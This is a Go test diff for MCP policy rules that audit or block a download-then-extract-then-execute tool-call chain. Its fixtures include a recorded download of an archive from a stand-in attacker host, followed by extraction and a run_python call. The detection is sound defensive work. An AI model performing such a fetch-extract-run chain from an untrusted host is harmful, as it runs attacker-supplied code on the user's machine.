@@ -921,3 +921,145 @@ func TestMCPSequenceRule_WalletResolutionThenPay(t *testing.T) {
 		}
 	})
 }
+
+// TestMCPSequenceRule_ArchiveExtractExecuteCWDShadowChain validates the real
+// authored chain rules (mcp-sc-audit-archive-extract-execute-cwd-shadow,
+// mcp-sc-block-archive-download-extract-execute-cwd-shadow, #3585) — the MCP
+// cross-call analogue of the shell-side sc-block-archive-download-extract-
+// inline-exec / sc-audit-archive-extract-inline-exec pair (#3569/#3584): an
+// extract_archive-family call followed by a run_python/execute_code-family
+// call, tiered to BLOCK when the archive was freshly fetched from an
+// archive-extension URL in the same short call window.
+func TestMCPSequenceRule_ArchiveExtractExecuteCWDShadowChain(t *testing.T) {
+	const auditRuleID = "mcp-sc-audit-archive-extract-execute-cwd-shadow"
+	const blockRuleID = "mcp-sc-block-archive-download-extract-execute-cwd-shadow"
+
+	rules := loadPremiumPackRules(t, "mcp-supply-chain-premium.yaml")
+	var auditRule, blockRule *MCPRule
+	for i := range rules {
+		switch rules[i].ID {
+		case auditRuleID:
+			auditRule = &rules[i]
+		case blockRuleID:
+			blockRule = &rules[i]
+		}
+	}
+	if auditRule == nil {
+		t.Fatalf("rule %q not found in premium pack", auditRuleID)
+	}
+	if blockRule == nil {
+		t.Fatalf("rule %q not found in premium pack", blockRuleID)
+	}
+	if auditRule.Match.Sequence == nil || len(auditRule.Match.Sequence.Steps) != 2 {
+		t.Fatalf("rule %q: expected a 2-step sequence block", auditRuleID)
+	}
+	if blockRule.Match.Sequence == nil || len(blockRule.Match.Sequence.Steps) != 3 {
+		t.Fatalf("rule %q: expected a 3-step sequence block", blockRuleID)
+	}
+
+	e := NewPolicyEvaluator(&MCPPolicy{
+		Defaults: MCPDefaults{Decision: policy.DecisionAllow},
+		Rules:    []MCPRule{*auditRule, *blockRule},
+	})
+
+	execCall := RecordedCall{
+		ToolName: "run_python",
+		Args:     map[string]interface{}{"code": "import base64\nprint(base64.b64decode('aGk=').decode())\n"},
+	}
+	fired := func(res MCPEvalResult, id string) bool {
+		for _, r := range res.TriggeredRules {
+			if r == id {
+				return true
+			}
+		}
+		return false
+	}
+
+	t.Run("extract then execute, no download — fires AUDIT only", func(t *testing.T) {
+		history := []RecordedCall{
+			{ToolName: "extract_archive", Args: map[string]interface{}{"path": "/workspace/fixtures.zip", "destination": "/workspace/fixtures"}},
+			execCall,
+		}
+		res := e.EvaluateToolCallWithHistory("run_python", execCall.Args, "", history)
+		if res.Decision != policy.DecisionAudit || !fired(res, auditRuleID) {
+			t.Errorf("expected AUDIT + audit rule fired; got decision=%v rules=%v", res.Decision, res.TriggeredRules)
+		}
+		if fired(res, blockRuleID) {
+			t.Errorf("block rule should not fire without a prior download step")
+		}
+	})
+
+	t.Run("download archive-URL, extract, execute — fires BLOCK", func(t *testing.T) {
+		history := []RecordedCall{
+			{ToolName: "download_file", Args: map[string]interface{}{"url": "https://attacker.example/notes.zip"}},
+			{ToolName: "extract_archive", Args: map[string]interface{}{"path": "/workspace/notes.zip", "destination": "/workspace/notes"}},
+			execCall,
+		}
+		res := e.EvaluateToolCallWithHistory("run_python", execCall.Args, "", history)
+		if res.Decision != policy.DecisionBlock || !fired(res, blockRuleID) {
+			t.Errorf("expected BLOCK + block rule fired; got decision=%v rules=%v", res.Decision, res.TriggeredRules)
+		}
+	})
+
+	t.Run("download non-archive URL, extract, execute — does not fire block rule", func(t *testing.T) {
+		history := []RecordedCall{
+			{ToolName: "download_file", Args: map[string]interface{}{"url": "https://cdn.example.com/api/status"}},
+			{ToolName: "extract_archive", Args: map[string]interface{}{"path": "/workspace/notes.zip", "destination": "/workspace/notes"}},
+			execCall,
+		}
+		res := e.EvaluateToolCallWithHistory("run_python", execCall.Args, "", history)
+		if fired(res, blockRuleID) {
+			t.Errorf("block rule requires the download URL to end in an archive extension; fired on a non-archive URL")
+		}
+		if !fired(res, auditRuleID) {
+			t.Errorf("audit rule should still fire on the extract+execute pair regardless of the download")
+		}
+	})
+
+	t.Run("execute-only tool call variants fire the audit step", func(t *testing.T) {
+		for _, execTool := range []string{"execute_code", "run_code", "code_interpreter", "jupyter_kernel_execute"} {
+			history := []RecordedCall{
+				{ToolName: "unzip_file", Args: map[string]interface{}{"file": "/tmp/data.zip", "destination": "/tmp/data"}},
+				{ToolName: execTool},
+			}
+			res := e.EvaluateToolCallWithHistory(execTool, nil, "", history)
+			if !fired(res, auditRuleID) {
+				t.Errorf("execute tool %q did not trigger the audit chain", execTool)
+			}
+		}
+	})
+
+	t.Run("execute with no prior extraction — does not fire", func(t *testing.T) {
+		history := []RecordedCall{
+			{ToolName: "list_files"}, {ToolName: "read_file"},
+			execCall,
+		}
+		res := e.EvaluateToolCallWithHistory("run_python", execCall.Args, "", history)
+		if fired(res, auditRuleID) || fired(res, blockRuleID) {
+			t.Errorf("chain requires a prior extraction step; fired without one")
+		}
+	})
+
+	t.Run("extraction with no follow-on execute — does not fire", func(t *testing.T) {
+		history := []RecordedCall{
+			{ToolName: "extract_archive", Args: map[string]interface{}{"path": "/workspace/fixtures.zip", "destination": "/workspace/fixtures"}},
+			{ToolName: "read_file"},
+		}
+		res := e.EvaluateToolCallWithHistory("read_file", nil, "", history)
+		if fired(res, auditRuleID) || fired(res, blockRuleID) {
+			t.Errorf("chain requires a follow-on execute step; fired on a read_file tail call")
+		}
+	})
+
+	t.Run("extraction outside the within_calls window — does not fire", func(t *testing.T) {
+		history := []RecordedCall{{ToolName: "extract_archive", Args: map[string]interface{}{"path": "/workspace/fixtures.zip", "destination": "/workspace/fixtures"}}}
+		for i := 0; i < 8; i++ {
+			history = append(history, RecordedCall{ToolName: "read_file"})
+		}
+		history = append(history, execCall)
+		res := e.EvaluateToolCallWithHistory("run_python", execCall.Args, "", history)
+		if fired(res, auditRuleID) {
+			t.Errorf("within_calls window not enforced: extraction is more than 8 calls before the execute")
+		}
+	})
+}
